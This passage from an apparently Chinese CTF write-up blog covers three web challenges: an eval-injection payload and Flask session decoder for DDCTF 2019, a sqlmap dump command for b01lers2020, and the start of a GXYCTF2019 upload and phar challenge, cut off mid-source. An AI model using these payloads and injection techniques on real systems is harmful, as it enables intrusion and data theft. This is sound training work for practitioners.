e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>大于5就可以拿到flag。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819152526783.png"></p><p>在这，是先加num_items，再扣point，所以思路为：buy_handler执行n次-&gt;get_flag-&gt;再判断不合法。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819212251820.png"></p><p>重点是在这里，可以执行任意代码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205352012.png"></p><p>然后测试看看这个<code>get_mid_str()</code>有啥用</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205437078.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystackevent <span class="token operator">=</span> <span class="token string">'action:ACTION;ARGS0#ARGS1#ARGS2'</span>action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OUTPUT:</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205449579.png"></p><p>eval可以把拼接的字符串变成函数赋值给<code>event_handler</code></p><p>而在eval里，后面有拼接字符串，该如何绕过呢？加个#即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">testfoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'test'</span> <span class="token operator">+</span> <span class="token string">'foo'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'test#'</span> <span class="token operator">+</span> <span class="token string">'foo'</span><span class="token punctuation">)</span>a<span class="token punctuation">(</span><span class="token punctuation">)</span>b<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后逻辑就清晰了让event为</p><pre class="line-numbers language-none"><code class="language-none">action:trigger_event#;action:buy;2#action:buy;3#action:get_flag;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-none"><code class="language-none">action&#x3D;trigger_event#args&#x3D;[&#39;action:buy;2&#39;, &#39;action:buy;3&#39;, &#39;action:get_flag;&#39;, &#39;&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>反复调用自己，执行多个函数获取flag。</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819214528531.png"></p><p>flag已经写入到session里了，获取一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215500512.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215513386.png"></p><h3 id="session解密"><a href="#session解密" class="headerlink" title="session解密"></a>session解密</h3><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                        <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                            <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">'.eJyNjUtrg0AURv9KuWsXEwcJCm5KG0lpR5JKx7khFB_BR7wTQW2TCf73ZlNCwIW7D87hfFdoTgV4u90VnlLwQEnBEukOIb0tDlF3gdGaJmaK5E2-cikNVjr89f27AePe-n9A_TUo09ap7ZhcLpqYP_8k0mGhWfsTTY0txtnyZhwxLvx5pY-ZpceQSQKXxzZ2SmZLpHOJvD8KUmeMCgcrZgsS9B5tS1W_9mGwvuAns5FEKV42jqgzLqLcnXcMeqDvqj9QBx6zoD1Vur9NPv4B7999zw.YR5gXg.LSzgKfQXTt9mIfaikeWHQTkAxZg'</span>decryption<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215404908.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[b01lers2020]Life on Mars</title>
      <link href="/p/2559628216.html"/>
      <url>/p/2559628216.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[SQLMAP]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819140435511.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>抓到包</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819145141889.png"></p><p>试了下，没想到是SQL注入，用order by测试下，两个字段。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819145933284.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-b01lers2020-Life-on-Mars/image-20210819145926078.png"></p><p>sqlmap跑一下，没啥好说的了。</p><pre class="line-numbers language-none"><code class="language-none">-D alien_code -T code -C code --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GXYCTF2019]BabysqliV3.0</title>
      <link href="/p/1000059223.html"/>
      <url>/p/1000059223.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[phar|手动激活phar|phar:///]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818223134859.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818224334283.png"></p><p>用户名输入admin</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818224349239.png"></p><p>试了下也没找着注入点，先爆破一下吧。</p><p>跑出来密码是password</p><p>/home.php?file=upload</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GXYCTF2019-BabysqliV3-0/image-20210818224938800.png"></p><p>尝试下伪协议，拿到upload.php源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    上传文件    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/uploads/"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".txt"</span><span class="token punctuation">;</span>        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span> <span class="token operator">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"echo '&lt;br>&lt;br>Master, I want to study rizhan!&lt;br>&lt;br>';"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[^a-z0-9]"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('illegal filename!');"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('you are too big (′▽`〃)');"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"move_uploaded_file('"</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"', '"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>        <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token comment">// return $sandbox.$this->Filename.$ext;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span 